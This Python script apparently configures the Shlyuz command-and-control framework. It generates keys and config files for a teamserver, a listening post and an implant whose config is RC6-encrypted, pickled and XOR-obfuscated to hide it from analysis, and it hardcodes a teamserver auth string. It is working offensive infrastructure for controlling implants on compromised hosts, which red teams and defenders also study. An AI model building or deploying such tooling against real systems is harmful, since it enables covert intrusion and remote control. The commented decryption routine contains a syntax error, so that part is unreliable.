import random
import string
import configparser
import pickle

from os import makedirs

import lib.banner  # What good are you without a banner?
import lib.crypto.asymmetric
import lib.crypto.rc6
import lib.crypto.xor

lib.banner.Banner()

def generate_private_key():
    return lib.crypto.asymmetric.generate_private_key()

def generate_rc6_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def generate_xor_key():
    return random.randint(0, 255)

# TODO: Check if the directory(ies) exist

# First attempt to generate the directories we need
makedirs("setup_configs")
makedirs("setup_configs/implant")
makedirs("setup_configs/teamserver")
makedirs("setup_configs/listening_post")

rc6_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
xor_key = generate_xor_key()
config_xor_key = generate_xor_key()
implant_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
# Make a directory for the implant
makedirs(f"setup_configs/implant/{implant_id}")
listening_post_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
# Make a directory for the listening_post
makedirs(f"setup_configs/listening_post/{listening_post_id}")
transport_name = "transport_bind_tcp_socket"
# task_check_time = input(f"task_check_time time (seconds): ")
task_check_time = 60
init_signature = b'\xDE\xAD\xF0\x0D' # You probably want to change this, but it works
teamserver_private_key = generate_private_key()
listening_post_private_key = generate_private_key()
implant_private_key = generate_private_key()


# TODO: take in http_addr and http_port to teamserver

teamserver_config = configparser.RawConfigParser()
teamserver_config.add_section("teamserver")
# teamserver_config.set("teamserver", "authstring", ''.join(random.choices(string.ascii_letters + string.digits, k=62))  # Randomized authstring
teamserver_config.set("teamserver", "authstring", "5243654tgbrhebs-tgr5ehjntdhyu563whtaghw65hrtagr.g5h7e6w5hert63") # Hardcoded authstring that works with the existing shell scripts
teamserver_config.set("teamserver", "http_addr", "0.0.0.0")  # TODO: Changeme
teamserver_config.set("teamserver", "http_port", "8080")  # TODO: Changeme
teamserver_config.set("teamserver", "l_addr", "0.0.0.0")  # TODO: Changeme
teamserver_config.set("teamserver", "l_port", 8081)  # TODO: Changeme
teamserver_config.set("teamserver", "root_return_string", "Попрешь на крутых, уроем как остальных")
teamserver_config.set("teamserver", "server_header", "Shlyuz")
teamserver_config.set("teamserver", "init_signature", init_signature)
teamserver_config.add_section("crypto")
teamserver_config.set("crypto", "rc6_key", rc6_key)
teamserver_config.set("crypto", "xor_key", hex(xor_key))
teamserver_config.set("crypto", "private_key", teamserver_private_key)
teamserver_config.add_section(f"listening_post_{listening_post_id}")
teamserver_config.set(f"listening_post_{listening_post_id}", "identifier", listening_post_id)
teamserver_config.set(f"listening_post_{listening_post_id}", "pubkey", listening_post_private_key.public_key)

# Write unencrypted configuration
with open(f"setup_configs/teamserver/shlyuz.conf", "w+") as ts_config_file:
    teamserver_config.write(ts_config_file)

# TODO: Take in LP http_addr, http_port

listening_post_config = configparser.RawConfigParser()
listening_post_config.add_section("lp")
listening_post_config.set("lp", "component_id", listening_post_id)
listening_post_config.set("lp", "init_signature", init_signature)
listening_post_config.add_section(f"{transport_name}")
listening_post_config.set(f"{transport_name}", "bind_addr", "0.0.0.0")  # TODO: Changeme
listening_post_config.set(f"{transport_name}", "bind_port", 8084)  # TODO: Changeme
listening_post_config.add_section("crypto")
listening_post_config.set("crypto", "sym_key", rc6_key)
listening_post_config.set("crypto", "private_key", listening_post_private_key)
listening_post_config.set("crypto", "tk_pk", teamserver_private_key.public_key)
listening_post_config.set("crypto", "xor_key", hex(xor_key))

# Write unencrypted configuration
with open(f"setup_configs/listening_post/{listening_post_id}/shlyuz.conf", "w+") as lp_config_file:
    listening_post_config.write(lp_config_file)


implant_config = configparser.RawConfigParser()
implant_config.add_section("vzhivlyat")
implant_config.set("vzhivlyat", "id", implant_id)
implant_config.set("vzhivlyat", "transport_name", transport_name)
implant_config.set("vzhivlyat", "task_check_time", task_check_time)
implant_config.set("vzhivlyat", "init_signature", init_signature)
implant_config.add_section("crypto")
implant_config.set("crypto", "lp_pk", listening_post_private_key.public_key)
implant_config.set("crypto", "sym_key", rc6_key)
implant_config.set("crypto", "xor_key", hex(xor_key))
implant_config.set("crypto", "priv_key", implant_private_key)

# Write unencrypted configuration
with open(f"setup_configs/implant/{implant_id}/shlyuz.conf.unencrypted", "w+") as unencrypted_implant_config_file:
    implant_config.write(unencrypted_implant_config_file)

# Write encrypted configuration
implant_config_encryption_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
print("!!!!! WRITE THIS DOWN SOMEWHERE !!!!!")
print(f"Configuration encryption key: {lib.crypto.xor.single_byte_xor(implant_config_encryption_key.encode('utf-8'), config_xor_key)}")
print("!!!!! !!!!!!!!!!!!!!!!!!!!!!!!! !!!!!\n")

with open(f"setup_configs/implant/{implant_id}/shlyuz.conf.unencrypted", "rb+") as unencrypted_implant_config_file:
    with open(f"setup_configs/implant/{implant_id}/shlyuz.conf", "wb+") as implant_config_file:
        config_bytes = unencrypted_implant_config_file.read()
        encrypted_contents = lib.crypto.rc6.encrypt(implant_config_encryption_key, config_bytes)
        pickled_encrypted = pickle.dumps(encrypted_contents)
        encoded_contents = lib.crypto.xor.single_byte_xor(pickled_encrypted, config_xor_key)
        implant_config_file.write(encoded_contents)

# # Decryption routine
# def read_encrypted_config():
#     with open("shlyuz_rev_tcp_socket.conf", "rb+") as configfile:
#         config_bytes = configfile.read()
#         decoded_content = lib.crypto.xor.single_byte_xor(config_bytes, config_xor_key)
#         pickled_decoded = pickle.loads(decoded_content)
#         decrypted_contents = lib.crypto.rc6.decrypt(implant)config_encryption_key, pickled_decoded)
#         decrypted_config = decrypted_contents.decode('utf-8')
#     return decrypted_config
#
# # Loading routine
# def loading():
#     config = configparser.RawConfigParser()
#     config.read_string(read_encrypted_config())
#     return config

# config = loading()

print(f"Configuration:")
print(f"[vzhivlyat][id]: {implant_id}")
print(f"[task_check_time]: {task_check_time}")
print(f"[vzhivlyat][transport_name]: {transport_name}")
print(f"[vzhivlyat][init_signature]: {init_signature}")
print(f"[crypto][sym_key]: {rc6_key}")
print(f"[crypto][xor_key]: {hex(xor_key)}")
print(f"Configuration encryption key: {lib.crypto.xor.single_byte_xor(implant_config_encryption_key.encode('utf-8'), config_xor_key)}")

